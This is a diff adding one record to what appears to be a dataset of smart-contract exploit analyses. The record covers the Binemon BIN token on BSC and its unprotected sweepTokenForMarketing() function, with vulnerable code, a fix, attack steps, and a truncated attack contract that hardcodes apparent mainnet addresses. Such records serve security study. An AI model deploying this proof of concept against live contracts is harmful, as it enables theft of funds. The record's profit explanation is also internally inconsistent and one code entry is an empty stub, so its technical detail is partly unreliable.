@@ -1,0 +1,34 @@
+{
+ "id": "2024__2024-03-XX_Binemon_SweepTokenAccessControl",
+ "source_file": "2024/2024-03-XX_Binemon_SweepTokenAccessControl.md",
+ "title": "Binemon — sweepTokenForMarketing Missing Access Control Analysis",
+ "date": "2024-03-01",
+ "protocol": "Binemon",
+ "chain": "BSC",
+ "loss_raw": "~0.2 BNB",
+ "loss_usd": null,
+ "root_cause": "`sweepTokenForMarketing()` has no access control, allowing anyone to call it repeatedly to drain the contract's BIN tokens and convert them to BNB via PancakeSwap",
+ "attack_tx": null,
+ "vulnerable_contract": "BIN 0xe56842Ed",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: sweepTokenForMarketing has no access control\nfunction sweepTokenForMarketing() external {\n    // No onlyOwner or onlyMarketing modifier\n    uint256 contractBalance = balanceOf(address(this));\n    if (contractBalance > 0) {\n        _transfer(address(this), marketingWallet, contractBalance);\n    }\n}\n\n// Even more dangerous if marketingWallet is not msg.sender but a hardcoded address,\n// or if the destination can be specified as sweepTo(address)\n\n//",
+  "// File: Binemon_decompiled.sol\ncontract Binemon {\n    function sweepTokenForMarketing() external {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: only owner can call\nfunction sweepTokenForMarketing() external onlyOwner {\n    uint256 contractBalance = balanceOf(address(this));\n    require(contractBalance > 0, \"nothing to sweep\");\n    _transfer(address(this), marketingWallet, contractBalance);\n    emit MarketingSweep(contractBalance);\n}"
+ ],
+ "steps": [
+  "→ [1] Swap WBNB → BIN (acquire initial position)",
+  "→ [2] Repeatedly call sweepTokenForMarketing()",
+  "→ [3] Wait for external users to buy BIN (price increases)",
+  "→ [4] Swap accumulated BIN → WBNB",
+  "→ [5] ~0.2 BNB profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Swap WBNB → BIN (acquire initial position)\n  │\n  ├─→ [2] Repeatedly call sweepTokenForMarketing()\n  │         └─ Drain contract BIN balance\n  │\n  ├─→ [3] Wait for external users to buy BIN (price increases)\n  │\n  ├─→ [4] Swap accumulated BIN → WBNB\n  │\n  └─→ [5] ~0.2 BNB profit",
+  "interface IBIN {\n    function sweepTokenForMarketing() external;\n    function balanceOf(address account) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\ncontract AttackContract {\n    IBIN          constant bin    = IBIN(0xe56842Ed550Ff2794F010738554db45E60730371);\n    IPancakeRouter constant router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    IERC20        constant WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n\n    function testExploit() external {\n        // [1] Initial WBNB → BIN swap\n        swapWBNBtoBIN(initialAmount);\n\n        // [2] Repeatedly call sweepTokenForMarketing to drain contract balance\n        while (bin.balanceOf(address(bin)) > 0) {\n            bin.sweepTokenForMarketi"
+ ]
+}
